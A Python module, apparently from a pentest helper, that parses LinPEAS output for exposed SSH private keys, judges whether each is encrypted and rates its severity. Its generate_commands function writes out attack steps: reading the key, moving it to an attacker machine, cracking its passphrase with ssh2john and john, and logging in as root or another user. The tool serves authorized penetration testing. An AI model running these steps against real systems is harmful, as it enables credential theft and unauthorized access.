"""Detect readable SSH private keys from LinPEAS output."""

import re
from typing import Dict, List, Optional

# Matches SSH private key file paths
_SSH_PATH_RE = re.compile(
    r"(/[^\s,;'\"]*(?:id_rsa|id_ed25519|id_dsa|id_ecdsa)[^\s,;'\"]*"
    r"|/[^\s,;'\"]+\.pem"
    r"|/[^\s,;'\"]+\.bak)",
    re.IGNORECASE,
)

# Markers in key content
# "BEGIN RSA/EC/DSA PRIVATE KEY" (no ENCRYPTED word) = unencrypted key.
# "BEGIN ENCRYPTED PRIVATE KEY" or "BEGIN OPENSSH PRIVATE KEY" + Proc-Type = encrypted.
_KEY_BEGIN_UNENCRYPTED_RE = re.compile(
    r"-----BEGIN\s+(?:RSA|EC|DSA)\s+PRIVATE KEY-----",
    re.IGNORECASE,
)
_KEY_BEGIN_POSSIBLY_ENCRYPTED_RE = re.compile(
    r"-----BEGIN\s+(?:OPENSSH|ENCRYPTED)\s+PRIVATE KEY-----",
    re.IGNORECASE,
)
_KEY_ENCRYPTED_RE = re.compile(
    r"Proc-Type:\s*4,ENCRYPTED|-----BEGIN ENCRYPTED PRIVATE KEY-----",
    re.IGNORECASE,
)


def parse_ssh_keys_section(section_text: str) -> List[Dict]:
    """Extract SSH private key paths and infer encryption status from content."""
    results: List[Dict] = []
    seen: set = set()

    has_begin = False
    confirmed_encrypted: Optional[bool] = None

    for line in section_text.splitlines():
        stripped = line.strip()
        # "BEGIN RSA/EC/DSA PRIVATE KEY" (no ENCRYPTED word) = confirmed unencrypted
        if _KEY_BEGIN_UNENCRYPTED_RE.search(stripped):
            has_begin = True
            confirmed_encrypted = False
        # "BEGIN OPENSSH/ENCRYPTED PRIVATE KEY" — may be encrypted
        if _KEY_BEGIN_POSSIBLY_ENCRYPTED_RE.search(stripped):
            has_begin = True
            if "ENCRYPTED" in stripped.upper():
                confirmed_encrypted = True
        if has_begin and _KEY_ENCRYPTED_RE.search(stripped):
            confirmed_encrypted = True

        for m in _SSH_PATH_RE.finditer(stripped):
            path = m.group(1).rstrip(".,;:'\")")
            if not path or path in seen:
                continue
            # Exclude clearly non-key paths (e.g. .bak files that aren't keys)
            name_lower = path.lower().rsplit("/", 1)[-1]
            is_key = any(k in name_lower for k in ("id_rsa", "id_ed25519", "id_dsa", "id_ecdsa", ".pem"))
            is_bak = name_lower.endswith(".bak") or ".bak" in name_lower
            if not (is_key or is_bak):
                continue
            seen.add(path)
            results.append({
                "path": path,
                "is_bak": is_bak,
                "encrypted": confirmed_encrypted,  # None = unknown
            })

    return results


def generate_commands(path: str, encrypted: Optional[bool]) -> List[str]:
    """Generate exploit steps for an SSH private key."""
    fname = path.rsplit("/", 1)[-1]
    cmds = [
        f"cat {path}",
        "# Transfer to attacker machine, then:",
        f"chmod 600 {fname}",
    ]
    if encrypted is True:
        cmds += [
            f"ssh2john {fname} > hash.txt",
            "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            f"ssh -i {fname} <user>@<target>",
        ]
    else:
        cmds += [
            f"ssh -i {fname} <user>@<target>",
            f"# Or: ssh -i {fname} root@<target>",
        ]
    return cmds


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for exposed SSH private keys.

    Returns CRITICAL for confirmed unencrypted keys, HIGH otherwise.
    """
    findings: List[Dict] = []
    for entry in parse_ssh_keys_section(section_text):
        path = entry["path"]
        encrypted = entry["encrypted"]
        severity = "CRITICAL" if encrypted is False else "HIGH"
        findings.append({
            "key_path": path,
            "severity": severity,
            "type": "ssh_keys",
            "encrypted": encrypted,
            "commands": generate_commands(path, encrypted),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
╔══════════╣ Possible private SSH keys found!
/opt/id_rsa.bak
/home/user/.ssh/id_rsa
"""
    print("=== analyze ===")
    for f in analyze(SAMPLE):
        enc = f["encrypted"]
        status = "unencrypted" if enc is False else ("encrypted" if enc else "unknown")
        print(f"[{f['severity']}] {f['type']} -> {f['key_path']}  ({status})")
        print(f"  TRY FIRST: $ {f['commands'][0]}")
